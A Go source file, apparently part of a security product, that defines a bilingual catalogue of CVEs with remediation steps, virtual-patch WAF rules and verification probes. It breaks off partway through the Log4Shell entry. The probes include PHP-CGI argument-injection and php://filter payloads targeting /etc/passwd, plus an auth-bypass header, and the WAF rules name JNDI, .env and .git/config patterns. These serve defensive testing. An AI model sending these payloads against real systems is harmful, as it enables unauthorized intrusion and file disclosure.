package service

import (
	"strings"

	"github.com/aivo-labs/aegis/backend/internal/domain"
)

// LocalizedText encapsule une chaîne bilingue (FR et EN) avec fallback sécurisé.
type LocalizedText struct {
	FR string
	EN string
}

// Get résout la chaîne selon la langue demandée ('en' ou 'fr').
func (l LocalizedText) Get(lang string) string {
	if strings.ToLower(strings.TrimSpace(lang)) == "en" {
		if l.EN != "" {
			return l.EN
		}
	}
	if l.FR != "" {
		return l.FR
	}
	return l.EN
}

// LocalizedSteps encapsule une liste d'étapes de procédure bilingue.
type LocalizedSteps struct {
	FR []string
	EN []string
}

// Get résout la liste d'étapes selon la langue demandée.
func (l LocalizedSteps) Get(lang string) []string {
	if strings.ToLower(strings.TrimSpace(lang)) == "en" && len(l.EN) > 0 {
		return l.EN
	}
	if len(l.FR) > 0 {
		return l.FR
	}
	return l.EN
}

// CveDefinition modélise une entrée du catalogue CVE avec support i18n natif et typé.
type CveDefinition struct {
	ID                  string
	CVEID               string
	Name                LocalizedText
	Severity            string
	CVSS                string
	Component           LocalizedText
	AffectedVersions    LocalizedText
	Title               LocalizedText
	Description         LocalizedText
	Vector              LocalizedText
	Remediation         LocalizedText
	BlockedByAegis      bool
	IsActiveDefense     bool
	CoverageStatus      string
	VirtualPatchRuleID  string
	VirtualPatchSummary LocalizedText
	RootFixProcedure    LocalizedSteps
	VerificationProbe   LocalizedText
	CISAKEV             bool
	PublishedAt         string
}

// ToWarning convertit la définition vers le modèle de domaine CVEWarning dans la langue ciblée.
func (d CveDefinition) ToWarning(lang string) domain.CVEWarning {
	return domain.CVEWarning{
		ID:                  d.ID,
		CVEID:               d.CVEID,
		Name:                d.Name.Get(lang),
		Severity:            d.Severity,
		CVSS:                d.CVSS,
		Component:           d.Component.Get(lang),
		AffectedVersions:    d.AffectedVersions.Get(lang),
		Title:               d.Title.Get(lang),
		Description:         d.Description.Get(lang),
		Vector:              d.Vector.Get(lang),
		Remediation:         d.Remediation.Get(lang),
		BlockedByAegis:      d.BlockedByAegis,
		IsActiveDefense:     d.IsActiveDefense,
		CoverageStatus:      d.CoverageStatus,
		VirtualPatchRuleID:  d.VirtualPatchRuleID,
		VirtualPatchSummary: d.VirtualPatchSummary.Get(lang),
		RootFixProcedure:    d.RootFixProcedure.Get(lang),
		VerificationProbe:   d.VerificationProbe.Get(lang),
		CISAKEV:             d.CISAKEV,
		PublishedAt:         d.PublishedAt,
	}
}

// LocalizedRules définit les règles de virtual patching Aegis bilingues.
var LocalizedRules = map[string]LocalizedText{
	"WAF-413-VOLUMETRIC": {
		FR: "Coupe-circuit volumétrique 32 Ko (HTTP 413 Payload Too Large) + protection Heap/Buffer PHP-FPM",
		EN: "32 KB volumetric circuit-breaker (HTTP 413 Payload Too Large) + PHP-FPM Heap/Buffer protection",
	},
	"WAF-PHP-CGI-ARGS": {
		FR: "Filtrage pré-compilé des directives CGI/FastCGI (allow_url_include, auto_prepend_file, php://input, %AD)",
		EN: "Pre-compiled CGI/FastCGI directive inspection (allow_url_include, auto_prepend_file, php://input, %AD)",
	},
	"WAF-PHP-FILTER-CHAIN": {
		FR: "Blocage des chaînes iconv/convert.iconv.* (CNEXT CVE-2024-2961) dans les paramètres et corps HTTP",
		EN: "Blocking of iconv/convert.iconv.* chains (CNEXT CVE-2024-2961) in HTTP parameters and body",
	},
	"WAF-NEXTJS-SUBREQ-STRIP": {
		FR: "Suppression et blocage de l'en-tête interne x-middleware-subrequest en bordure Ingress",
		EN: "Stripping and blocking of internal x-middleware-subrequest header at Ingress edge",
	},
	"WAF-LOG4J-JNDI": {
		FR: "Interception heuristique des motifs ${jndi:ldap/rmi/dns:...} dans les URI, en-têtes et payloads",
		EN: "Heuristic pattern filtering of ${jndi:ldap/rmi/dns:...} across URIs, headers, and payloads",
	},
	"WAF-CMS-SHIELD": {
		FR: "Verrouillage de /xmlrpc.php, /wp-json/wp/v2/users, /.env, /.git/config et brute-force /wp-login.php",
		EN: "Lockdown of /xmlrpc.php, /wp-json/wp/v2/users, /.env, /.git/config and /wp-login.php brute-force",
	},
	"WAF-HEADER-SANITIZER": {
		FR: "Masquage des bannières Server / X-Powered-By et protection HTTP/2 Rapid Reset",
		EN: "Server / X-Powered-By banner cloaking and HTTP/2 Rapid Reset mitigation",
	},
	"WAF-SQLI-AST-FILTER": {
		FR: "Détection d'injections SQL et variables d'environnement malveillantes",
		EN: "AST-based SQL injection detection and malicious environment variable filtering",
	},
	"K8S-AEGIS-GATE-INGRESS": {
		FR: "Isolation de l'Admission Webhook Kubernetes et filtrage des annotations Ingress-NGINX",
		EN: "Kubernetes Admission Webhook network isolation and Ingress-NGINX annotation filtering",
	},
	"EGRESS-C2-SINKHOLE": {
		FR: "Sinkhole DNS :5053 (0.0.0.0) + Calculateur d'Entropie de Shannon (H > 4.2 bits) + coupure TCP sortante",
		EN: "DNS Sinkhole :5053 (0.0.0.0) + Shannon Entropy Calculator (H > 4.2 bits) + outbound TCP severance",
	},
}

// CatalogDefinitions recense l'intégralité des CVEs du catalogue avec leurs textes bilingues FR et EN.
var CatalogDefinitions = []CveDefinition{
	{
		ID:    "CVE-2026-114938",
		CVEID: "CVE-2026-114938",
		Name: LocalizedText{
			FR: "Java4Shell — Corruption mémoire Base64 OpenJDK AVX-512 & RCE (Keycloak)",
			EN: "Java4Shell — OpenJDK AVX-512 Base64 Memory Corruption RCE (Keycloak)",
		},
		Severity: "CRITICAL",
		CVSS:     "9.8",
		Component: LocalizedText{
			FR: "Décodeur Base64 OpenJDK vectorisé (AVX-512 VBMI) / Serveur Keycloak",
			EN: "OpenJDK Vectorized Base64 Decoder (AVX-512 VBMI) / Keycloak Server",
		},
		AffectedVersions: LocalizedText{
			FR: "OpenJDK >= 17.0.6 (dont 21 & 25) sur CPU x86-64 avec avx512vbmi / Keycloak <= 26.8.2",
			EN: "OpenJDK >= 17.0.6 (including 21 & 25) on x86-64 with avx512vbmi / Keycloak <= 26.8.2",
		},
		Title: LocalizedText{
			FR: "Corruption mémoire pré-authentification dans les intrinsics Base64 menant à une RCE sur Keycloak",
			EN: "Pre-authentication memory corruption in Base64 intrinsics leading to RCE on Keycloak",
		},
		Description: LocalizedText{
			FR: "Une vulnérabilité critique dans le décodeur Base64 accéléré d'OpenJDK permet à un attaquant distant non authentifié de corrompre la mémoire heap de la JVM via un payload forgé, déclenchant l'exécution de code à distance (RCE) sur les instances Keycloak hébergées sur des CPU disposant du jeu d'instructions AVX-512 VBMI.",
			EN: "A critical flaw in OpenJDK's accelerated Base64 decoder allows an unauthenticated remote attacker to corrupt JVM heap memory via a malformed value, enabling Remote Code Execution (RCE) on Keycloak instances running on x86-64 CPUs with AVX-512 VBMI instruction set.",
		},
		Vector: LocalizedText{
			FR: "RÉSEAU / HTTP Ingress (Basic Auth, jetons SAML/OIDC) + RCE JVM + C2 sortant",
			EN: "NETWORK / HTTP Ingress (Basic Auth, SAML/OIDC tokens) + JVM RCE + Outbound C2",
		},
		Remediation: LocalizedText{
			FR: "1. [Atténuation Aegis] Rejet des payloads volumétriques (> 32 Ko) + Sinkhole DNS Egress. 2. [Mitigation JVM Immédiate] Définir JAVA_OPTS_APPEND=-XX:-UseBASE64Intrinsics. 3. [Racine] Mettre à jour OpenJDK.",
			EN: "1. [Aegis Mitigation] 32 KB volumetric breaker + Egress DNS Sinkhole. 2. [Immediate JVM Mitigation] Set JAVA_OPTS_APPEND=-XX:-UseBASE64Intrinsics. 3. [Root Fix] Upgrade OpenJDK.",
		},
		BlockedByAegis:      false,
		IsActiveDefense:     true,
		CoverageStatus:      "HOST_PATCH_REQUIRED",
		VirtualPatchRuleID:  "WAF-413-VOLUMETRIC + EGRESS-C2-SINKHOLE (Mitigation Post-RCE)",
		VirtualPatchSummary: LocalizedText{
			FR: "Aegis Gate bloque les charges volumétriques massives (> 32 Ko) et Aegis Egress sinkhole immédiatement les callbacks vers un C2. Cependant, un flag JVM d'hôte (-XX:-UseBASE64Intrinsics) est indispensable pour neutraliser le bogue interne OpenJDK.",
			EN: "Aegis Gate drops oversized payloads (> 32 KB) and Aegis Egress severs outbound C2 callbacks. However, a JVM host flag (-XX:-UseBASE64Intrinsics) remains mandatory to neutralize the bug inside OpenJDK runtime.",
		},
		RootFixProcedure: LocalizedSteps{
			FR: []string{
				"Vérifier si le CPU de l'hôte expose le jeu d'instructions : grep -m1 '^flags' /proc/cpuinfo | grep -qw avx512vbmi && echo 'AVX-512 VBMI exposé' || echo 'Non vulnérable'",
				"Si avx512vbmi est présent, ajouter la variable d'environnement sur Keycloak : JAVA_OPTS_APPEND=-XX:-UseBASE64Intrinsics",
				"Redémarrer l'instance Keycloak : docker compose restart keycloak ou systemctl restart keycloak",
				"Vérifier la désactivation dans la JVM en cours : docker exec <container> jcmd io.quarkus.bootstrap.runner.QuarkusEntryPoint VM.flags -all | grep UseBASE64Intrinsics (Attendu: bool UseBASE64Intrinsics = false)",
				"Mettre à jour le runtime OpenJDK dès la parution des paquets correctifs de votre distribution.",
			},
			EN: []string{
				"Check whether host CPU exposes vulnerable instructions: grep -m1 '^flags' /proc/cpuinfo | grep -qw avx512vbmi && echo 'AVX-512 VBMI exposed' || echo 'Not vulnerable'",
				"If avx512vbmi is present, inject environment variable into Keycloak: JAVA_OPTS_APPEND=-XX:-UseBASE64Intrinsics",
				"Restart Keycloak instance: docker compose restart keycloak or systemctl restart keycloak",
				"Verify effective flag on running JVM: docker exec <container> jcmd io.quarkus.bootstrap.runner.QuarkusEntryPoint VM.flags -all | grep UseBASE64Intrinsics (Expected: bool UseBASE64Intrinsics = false)",
				"Deploy distribution OpenJDK security update once available.",
			},
		},
		VerificationProbe: LocalizedText{
			FR: "docker exec <keycloak> jcmd io.quarkus.bootstrap.runner.QuarkusEntryPoint VM.flags -all | grep UseBASE64Intrinsics  # Attendu: bool UseBASE64Intrinsics = false",
			EN: "docker exec <keycloak> jcmd io.quarkus.bootstrap.runner.QuarkusEntryPoint VM.flags -all | grep UseBASE64Intrinsics  # Expected: bool UseBASE64Intrinsics = false",
		},
		CISAKEV:     false,
		PublishedAt: "2026-11-18",
	},
	{
		ID:    "CVE-2026-109618",
		CVEID: "CVE-2026-109618",
		Name: LocalizedText{
			FR: "PHP2Shell FastCGI Buffer Overflow & Reverse Shell",
			EN: "PHP2Shell FastCGI Buffer Overflow & Reverse Shell",
		},
		Severity: "CRITICAL",
		CVSS:     "9.8",
		Component: LocalizedText{
			FR: "Moteur de tampons PHP SAPI / FastCGI (PHP2Shell)",
			EN: "PHP SAPI / FastCGI Buffer Engine (PHP2Shell)",
		},
		AffectedVersions: LocalizedText{
			FR: "PHP < 8.2.26 / 8.3.14 sans limite volumétrique amont",
			EN: "PHP < 8.2.26 / 8.3.14 without upstream volumetric payload limit",
		},
		Title: LocalizedText{
			FR: "Dépassement de tampon volumétrique (Buffer/Heap Overflow) & Reverse Shell",
			EN: "Volumetric Buffer/Heap Overflow & Reverse Shell Execution",
		},
		Description: LocalizedText{
			FR: "Exploitation par injection de payloads surdimensionnés excédant les tampons mémoires des workers PHP-FPM, détournant le pointeur d'instruction pour ouvrir un Reverse Shell interactif.",
			EN: "Exploitation through oversized payload injection exceeding PHP-FPM worker memory buffers, hijacking the instruction pointer to open an interactive Reverse Shell.",
		},
		Vector: LocalizedText{
			FR: "RÉSEAU / HTTP POST > 32 Ko + C2 TCP sortant",
			EN: "NETWORK / HTTP POST > 32 KB + Outbound TCP C2",
		},
		Remediation: LocalizedText{
			FR: "1. [Immédiat] Activer le coupe-circuit 32 Ko d'Aegis Gate (HTTP 413) + Sinkhole DNS Egress. 2. [Racine] Mettre à jour PHP-FPM, restreindre post_max_size et désactiver exec/shell_exec.",
			EN: "1. [Immediate] Enable Aegis Gate 32 KB volumetric breaker (HTTP 413) + Egress DNS Sinkhole. 2. [Root Fix] Upgrade PHP-FPM, restrict post_max_size, and disable exec/shell_exec.",
		},
		BlockedByAegis:      true,
		IsActiveDefense:     true,
		CoverageStatus:      "COVERED_VIRTUAL_PATCH",
		VirtualPatchRuleID:  "WAF-413-VOLUMETRIC + EGRESS-C2-SINKHOLE",
		VirtualPatchSummary: LocalizedText{
			FR: "Rejet immédiat en mémoire à l'Edge (HTTP 413 en < 0.3 ms) de tout corps de requête dépassant 32 Ko avant qu'il n'atteigne PHP-FPM, doublé du blocage DNS/TCP sortant en cas de tentative de callback shell.",
			EN: "Immediate in-memory Edge rejection (HTTP 413 in < 0.3 ms) of any request body exceeding 32 KB before reaching PHP-FPM, paired with outbound DNS/TCP severance on shell callback attempts.",
		},
		RootFixProcedure: LocalizedSteps{
			FR: []string{
				"Mettre à jour les paquets PHP vers la dernière version patchée : sudo apt update && sudo apt install --only-upgrade php-fpm php-cli",
				"Durcir /etc/php/*/fpm/php.ini : définir expose_php = Off, allow_url_include = Off, post_max_size = 8M et disable_functions = exec,passthru,shell_exec,system,proc_open,popen",
				"Limiter la taille maximale au niveau du reverse-proxy local (Nginx : client_max_body_size 1m;) et redémarrer le service : sudo systemctl restart php*-fpm",
				"Vérifier l'absence de processus enfants suspects : ps auxf | grep -E 'php-fpm|sh|nc|bash'",
			},
			EN: []string{
				"Upgrade PHP packages to the latest patched release: sudo apt update && sudo apt install --only-upgrade php-fpm php-cli",
				"Harden /etc/php/*/fpm/php.ini: set expose_php = Off, allow_url_include = Off, post_max_size = 8M and disable_functions = exec,passthru,shell_exec,system,proc_open,popen",
				"Enforce maximum request body size at local reverse-proxy (Nginx: client_max_body_size 1m;) and restart service: sudo systemctl restart php*-fpm",
				"Verify the absence of suspicious child processes: ps auxf | grep -E 'php-fpm|sh|nc|bash'",
			},
		},
		VerificationProbe: LocalizedText{
			FR: "curl -i -X POST https://<domaine>/ -H 'Content-Type: application/octet-stream' --data-binary $(head -c 40000 /dev/zero | tr '\\0' 'A')  # Attendu: HTTP/1.1 413 Payload Too Large",
			EN: "curl -i -X POST https://<domain>/ -H 'Content-Type: application/octet-stream' --data-binary $(head -c 40000 /dev/zero | tr '\\0' 'A')  # Expected: HTTP/1.1 413 Payload Too Large",
		},
		CISAKEV:     true,
		PublishedAt: "2026-02-14",
	},
	{
		ID:    "CVE-2024-4577",
		CVEID: "CVE-2024-4577",
		Name: LocalizedText{
			FR: "PHP-CGI Argument Injection RCE",
			EN: "PHP-CGI Argument Injection RCE",
		},
		Severity: "CRITICAL",
		CVSS:     "9.8",
		Component: LocalizedText{
			FR: "Exécutable PHP-CGI / Environnement PHP-FPM",
			EN: "PHP-CGI Runtime / PHP-FPM Environment",
		},
		AffectedVersions: LocalizedText{
			FR: "PHP 8.1 < 8.1.29, 8.2 < 8.2.20, 8.3 < 8.3.8",
			EN: "PHP 8.1 < 8.1.29, 8.2 < 8.2.20, 8.3 < 8.3.8",
		},
		Title: LocalizedText{
			FR: "Exécution de code à distance (RCE) par injection d'arguments CGI (allow_url_include)",
			EN: "Remote Code Execution (RCE) via CGI Argument Injection (allow_url_include)",
		},
		Description: LocalizedText{
			FR: "Contournement de l'échappement des caractères (notamment via le caractère soft-hyphen 0xAD) permettant d'injecter -d allow_url_include=1 -d auto_prepend_file=php://input pour exécuter du code arbitraire.",
			EN: "Character escaping bypass (specifically via the soft-hyphen character 0xAD) allowing injection of -d allow_url_include=1 -d auto_prepend_file=php://input to execute arbitrary code.",
		},
		Vector: LocalizedText{
			FR: "RÉSEAU / Query String ?%ADd+allow_url_include%3d1",
			EN: "NETWORK / Query String ?%ADd+allow_url_include%3d1",
		},
		Remediation: LocalizedText{
			FR: "1. [Immédiat] Filtrage à chaud via la règle WAF-PHP-CGI-ARGS d'Aegis Gate. 2. [Racine] Mise à jour vers PHP >= 8.3.8 / 8.2.20 et désactivation du mode CGI direct.",
			EN: "1. [Immediate] In-memory filtering via Aegis Gate WAF-PHP-CGI-ARGS rule. 2. [Root Fix] Upgrade to PHP >= 8.3.8 / 8.2.20 and disable direct CGI mode.",
		},
		BlockedByAegis:      true,
		IsActiveDefense:     true,
		CoverageStatus:      "COVERED_VIRTUAL_PATCH",
		VirtualPatchRuleID:  "WAF-PHP-CGI-ARGS",
		VirtualPatchSummary: LocalizedText{
			FR: "Inspection de la Query String et de l'URI décodée : blocage HTTP 403 instantané des séquences allow_url_include, auto_prepend_file, php://input et séquences hexadécimales %AD.",
			EN: "Inspection of decoded Query String and URI: instant HTTP 403 rejection of allow_url_include, auto_prepend_file, php://input and hexadecimal %AD sequences.",
		},
		RootFixProcedure: LocalizedSteps{
			FR: []string{
				"Mettre à niveau PHP vers >= 8.3.8, 8.2.20 ou 8.1.29 : sudo apt update && sudo apt upgrade php-fpm php-cgi",
				"Dans php.ini, forcer cgi.force_redirect = 1, allow_url_fopen = Off et allow_url_include = Off",
				"Remplacer tout montage CGI historique par FastCGI (php-fpm via socket Unix isolé) et interdire l'accès direct à /cgi-bin/",
			},
			EN: []string{
				"Upgrade PHP to >= 8.3.8, 8.2.20, or 8.1.29: sudo apt update && sudo apt upgrade php-fpm php-cgi",
				"In php.ini, enforce cgi.force_redirect = 1, allow_url_fopen = Off, and allow_url_include = Off",
				"Replace legacy CGI mounts with FastCGI (isolated php-fpm Unix socket) and block direct access to /cgi-bin/",
			},
		},
		VerificationProbe: LocalizedText{
			FR: "curl -i 'https://<domaine>/index.php?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'  # Attendu: HTTP 403 Forbidden",
			EN: "curl -i 'https://<domain>/index.php?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'  # Expected: HTTP 403 Forbidden",
		},
		CISAKEV:     true,
		PublishedAt: "2024-06-06",
	},
	{
		ID:    "CVE-2024-2961",
		CVEID: "CVE-2024-2961",
		Name: LocalizedText{
			FR: "glibc iconv Buffer Overflow to PHP RCE (CNEXT)",
			EN: "glibc iconv Buffer Overflow to PHP RCE (CNEXT)",
		},
		Severity: "CRITICAL",
		CVSS:     "9.8",
		Component: LocalizedText{
			FR: "Bibliothèque GNU C (glibc iconv) / Filtres PHP",
			EN: "GNU C Library (glibc iconv) / PHP Stream Filters",
		},
		AffectedVersions: LocalizedText{
			FR: "glibc <= 2.39 (ISO-2022-CN-EXT)",
			EN: "glibc <= 2.39 (ISO-2022-CN-EXT)",
		},
		Title: LocalizedText{
			FR: "Dépassement de tampon glibc iconv transformant une lecture de fichier PHP en RCE (CNEXT)",
			EN: "glibc iconv Buffer Overflow converting local file read to Remote Code Execution (CNEXT)",
		},
		Description: LocalizedText{
			FR: "Une écriture hors limites de 4 octets dans iconv() lors de la conversion vers ISO-2022-CN-EXT permet d'exploiter les filtres php://filter/convert.iconv.* pour exécuter du code à distance.",
			EN: "A 4-byte out-of-bounds write in iconv() during conversion to ISO-2022-CN-EXT allows exploiting php://filter/convert.iconv.* to achieve arbitrary code execution.",
		},
		Vector: LocalizedText{
			FR: "RÉSEAU / php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT",
			EN: "NETWORK / php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT",
		},
		Remediation: LocalizedText{
			FR: "1. [Immédiat] Blocage des chaînes php://filter et ISO-2022-CN-EXT par Aegis Gate. 2. [Racine] Mettre à jour le paquet libc6 / glibc sur le serveur Linux.",
			EN: "1. [Immediate] Block php://filter and ISO-2022-CN-EXT strings at Aegis Gate. 2. [Root Fix] Upgrade libc6 / glibc packages on the Linux host.",
		},
		BlockedByAegis:      true,
		IsActiveDefense:     true,
		CoverageStatus:      "COVERED_VIRTUAL_PATCH",
		VirtualPatchRuleID:  "WAF-PHP-FILTER-CHAIN",
		VirtualPatchSummary: LocalizedText{
			FR: "Interception à chaud de toute requête contenant php://filter, convert.iconv ou ISO-2022-CN-EXT dans les paramètres, en-têtes ou corps POST.",
			EN: "Live inspection of incoming requests containing php://filter, convert.iconv, or ISO-2022-CN-EXT in query parameters, headers, or POST body.",
		},
		RootFixProcedure: LocalizedSteps{
			FR: []string{
				"Mettre à jour la bibliothèque C du système hôte et des conteneurs : sudo apt update && sudo apt install --only-upgrade libc6 libc-bin",
				"Option de contournement immédiat si redémarrage impossible : retirer ISO-2022-CN-EXT de /usr/lib/x86_64-linux-gnu/gconv/gconv-modules et exécuter sudo iconvconfig",
				"Redémarrer les services PHP-FPM et conteneurs applicatifs pour charger la nouvelle glibc en RAM",
			},
			EN: []string{
				"Upgrade C library on host system and base containers: sudo apt update && sudo apt install --only-upgrade libc6 libc-bin",
				"Immediate hot mitigation if reboot cannot be scheduled: remove ISO-2022-CN-EXT from gconv-modules and run sudo iconvconfig",
				"Restart PHP-FPM services and application containers to load the updated glibc into RAM",
			},
		},
		VerificationProbe: LocalizedText{
			FR: "curl -i 'https://<domaine>/?file=php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=/etc/passwd'  # Attendu: HTTP 403 Forbidden",
			EN: "curl -i 'https://<domain>/?file=php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=/etc/passwd'  # Expected: HTTP 403 Forbidden",
		},
		CISAKEV:     true,
		PublishedAt: "2024-04-17",
	},
	{
		ID:    "CVE-2025-29927",
		CVEID: "CVE-2025-29927",
		Name: LocalizedText{
			FR: "Next.js Middleware Authorization Bypass",
			EN: "Next.js Middleware Authorization Bypass",
		},
		Severity: "CRITICAL",
		CVSS:     "9.1",
		Component: LocalizedText{
			FR: "Routage Middleware Next.js",
			EN: "Next.js Middleware Routing Engine",
		},
		AffectedVersions: LocalizedText{
			FR: "Next.js < 15.2.3, < 14.2.25, < 13.5.9, < 12.3.5",
			EN: "Next.js < 15.2.3, < 14.2.25, < 13.5.9, < 12.3.5",
		},
		Title: LocalizedText{
			FR: "Contournement complet d'authentification Middleware via l'en-tête x-middleware-subrequest",
			EN: "Complete Middleware Authentication Bypass via x-middleware-subrequest header",
		},
		Description: LocalizedText{
			FR: "L'envoi de l'en-tête interne x-middleware-subrequest par un client externe force Next.js à ignorer l'exécution de son Middleware d'authentification et de contrôle d'accès.",
			EN: "Sending the internal x-middleware-subrequest header from an external client forces Next.js to skip execution of authentication and access control Middlewares.",
		},
		Vector: LocalizedText{
			FR: "RÉSEAU / En-tête HTTP x-middleware-subrequest",
			EN: "NETWORK / HTTP Header x-middleware-subrequest",
		},
		Remediation: LocalizedText{
			FR: "1. [Immédiat] Purge et blocage de l'en-tête x-middleware-subrequest par Aegis Gate PEP. 2. [Racine] Mettre à jour Next.js vers >= 15.2.3 ou 14.2.25.",
			EN: "1. [Immediate] Strip and block x-middleware-subrequest header at Aegis Gate PEP. 2. [Root Fix] Upgrade Next.js to >= 15.2.3 or 14.2.25.",
		},
		BlockedByAegis:      true,
		IsActiveDefense:     true,
		CoverageStatus:      "COVERED_VIRTUAL_PATCH",
		VirtualPatchRuleID:  "WAF-NEXTJS-SUBREQ-STRIP",
		VirtualPatchSummary: LocalizedText{
			FR: "Aegis Gate rejette (HTTP 403) et nettoie systématiquement tout en-tête x-middleware-subrequest provenant d'une requête externe avant transfert au conteneur Node.js.",
			EN: "Aegis Gate systematically strips and rejects (HTTP 403) any incoming x-middleware-subrequest header before forwarding traffic to the Node.js container.",
		},
		RootFixProcedure: LocalizedSteps{
			FR: []string{
				"Mettre à jour la dépendance Next.js dans package.json : npm install next@latest (ou >= 15.2.3 / 14.2.25)",
				"Si la mise à jour applicative est différée, bloquer l'en-tête au niveau du Reverse Proxy (Traefik / Nginx : proxy_set_header x-middleware-subrequest \"\";)",
				"Reconstruire et redéployer l'image Docker de l'application frontend",
			},
			EN: []string{
				"Update Next.js dependency in package.json: npm install next@latest (or >= 15.2.3 / 14.2.25)",
				"If application release is postponed, strip header at reverse-proxy level (Traefik / Nginx: proxy_set_header x-middleware-subrequest \"\";)",
				"Rebuild and redeploy frontend Docker container image",
			},
		},
		VerificationProbe: LocalizedText{
			FR: "curl -i https://<domaine>/admin -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'  # Attendu: HTTP 403 Forbidden",
			EN: "curl -i https://<domain>/admin -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'  # Expected: HTTP 403 Forbidden",
		},
		CISAKEV:     true,
		PublishedAt: "2025-03-21",
	},
	{
		ID:    "CVE-2025-1974",
		CVEID: "CVE-2025-1974",
		Name: LocalizedText{
			FR: "IngressNightmare — Kubernetes Ingress-NGINX RCE",
			EN: "IngressNightmare — Kubernetes Ingress-NGINX RCE",
		},
		Severity: "CRITICAL",
		CVSS:     "9.8",
		Component: LocalizedText{
			FR: "Contrôleur d'admission Kubernetes Ingress-NGINX",
			EN: "Kubernetes Ingress-NGINX Admission Controller",
		},
		AffectedVersions: LocalizedText{
			FR: "Ingress-NGINX < 1.11.5 / < 1.12.1",
			EN: "Ingress-NGINX < 1.11.5 / < 1.12.1",
		},
		Title: LocalizedText{
			FR: "Exécution de code non authentifiée (RCE) sur le contrôleur Kubernetes Ingress-NGINX",
			EN: "Unauthenticated Remote Code Execution (RCE) on Kubernetes Ingress-NGINX Controller",
		},
		Description: LocalizedText{
			FR: "Injection de directives de configuration via l'Admission Webhook d'Ingress-NGINX permettant l'exécution de code arbitraire et le vol de tous les Secrets Kubernetes du cluster.",
			EN: "Configuration directive injection through Ingress-NGINX Admission Webhook allowing arbitrary code execution and exfiltration of all Kubernetes Secrets across the cluster.",
		},
		Vector: LocalizedText{
			FR: "KUBERNETES / Admission Webhook :8443 + Injection de Bibliothèque Partagée",
			EN: "KUBERNETES / Admission Webhook :8443 + Shared Library Injection",
		},
		Remediation: LocalizedText{
			FR: "1. [Immédiat] Isoler le Webhook d'admission avec Aegis Gate Kubernetes Operator. 2. [Racine] Mettre à jour Ingress-NGINX vers >= 1.12.1 et restreindre la NetworkPolicy.",
			EN: "1. [Immediate] Isolate admission webhook with Aegis Gate Kubernetes Operator. 2. [Root Fix] Upgrade Ingress-NGINX to >= 1.12.1 and restrict cluster NetworkPolicy.",
		},
		BlockedByAegis:      true,
		IsActiveDefense:     true,
		CoverageStatus:      "COVERED_VIRTUAL_PATCH",
		VirtualPatchRuleID:  "K8S-AEGIS-GATE-INGRESS",
		VirtualPatchSummary: LocalizedText{
			FR: "Aegis Gate protège le point d'entrée Ingress, bloque les requêtes externes vers les ports d'admission (:8443) et neutralise le chargement de bibliothèques partagées distantes.",
			EN: "Aegis Gate protects Ingress entrypoint, blocks external probes towards admission ports (:8443), and neutralizes remote shared library execution.",
		},
		RootFixProcedure: LocalizedSteps{
			FR: []string{
				"Mettre à niveau le chart Helm ingress-nginx vers >= 4.12.1 (controller v1.12.1) ou >= 4.11.5 (controller v1.11.5)",
				"Appliquer une NetworkPolicy Kubernetes autorisant uniquement le kube-apiserver à joindre le port 8443 de l'Admission Webhook",
				"Désactiver temporairement enable-annotation-validation si l'admission webhook est exposée sur le réseau interne non segmenté",
			},
			EN: []string{
				"Upgrade ingress-nginx Helm chart to >= 4.12.1 (controller v1.12.1) or >= 4.11.5 (controller v1.11.5)",
				"Apply a Kubernetes NetworkPolicy allowing only kube-apiserver to reach admission webhook port 8443",
				"Temporarily disable enable-annotation-validation if webhook is exposed on unsegmented internal network",
			},
		},
		VerificationProbe: LocalizedText{
			FR: "kubectl get validatingwebhookconfigurations -o yaml | grep -i ingress-nginx  # Vérifier l'isolation réseau du service webhook",
			EN: "kubectl get validatingwebhookconfigurations -o yaml | grep -i ingress-nginx  # Verify network isolation of webhook service",
		},
		CISAKEV:     true,
		PublishedAt: "2025-03-24",
	},
	{
		ID:    "CVE-2021-44228",
		CVEID: "CVE-2021-44228",
		Name: LocalizedText{
			FR: "Apache Log4j2 JNDI Lookup RCE (Log4Shell)",
			EN: "Apache Log4j2 JNDI Lookup RCE (Log4Shell)",
		},
		Severity: "CRITICAL",
		CVSS:     "10.0",
		Component: LocalizedText{
			FR: "Apache Log4j2 (Services JVM)",
			EN: "Apache Log4j2 (JVM Services)",
		},
		AffectedVersions: LocalizedText{
			FR: "Log4j 2.0-beta9 à 2.15.0",
			EN: "Log4j 2.0-beta9 to 2.15.0",
		},
		Title: LocalizedText{
			FR: "Exécution de code à distance Log4Shell via résolution JNDI / LDAP sortante",
			EN: "Log4Shell Remote Code Execution via Outbound JNDI / LDAP Lookup",
		},
		Description: LocalizedText{
			FR: "Injection de motifs ${jndi:ldap://...} dans les en-têtes HTTP (User-Agent, X-Forwarded-For) déclenchant une connexion sortante vers un serveur LDAP malveillant et le chargement d'une classe Java.",
			EN: "Injection of ${jndi:ldap://...} patterns in HTTP headers triggering an outbound connection to an attacker LDAP server and arbitrary Java class loading.",
		},
		Vector: LocalizedText{
			FR: "RÉSEAU / En-tête ${jndi:ldap://...} + LDAP/RMI sortant",
			EN: "NETWORK / Header ${jndi:ldap://...} + Outbound LDAP/RMI",
		},
		Remediation: LocalizedText{
			FR: "1. [Immédiat] Double blocage Aegis Gate (signature JNDI entrante) + Aegis Egress (blocage LDAP/RMI sortant). 2. [Racine] Mettre à jour Log4j vers >= 2.17.1.",
			EN: "1. [Immediate] Dual-layer shield: Aegis Gate (inbound JNDI signature) + Aegis Egress (outbound LDAP/RMI cutoff). 2. [Root Fix] Upgrade Log4j to >= 2.17.1.",
		},
		BlockedByAegis:      true,
		IsActiveDefense:     true,
		CoverageStatus:      "COVERED_VIRTUAL_PATCH",
		VirtualPatchRuleID:  "WAF-LOG4J-JNDI + EGRESS-C2-SINKHOLE",
		VirtualPatchSummary: LocalizedText{
			FR: "Double barrière : Aegis Gate bloque toute variante obfusquée (${jndi:..., ${lower:...) en entrée (HTTP 403) et Aegis Egress coupe toute résolution DNS/connexion sortante vers l'infrastructure de l'attaquant.",
			EN: "Dual-layer defense: Aegis Gate drops obfuscated patterns (${jndi:..., ${lower:...) at ingress (HTTP 403) and Aegis Egress severs DNS resolution and outbound connections to attacker C2.",
		},
		RootFixProcedure: LocalizedSteps{
			FR: []string{
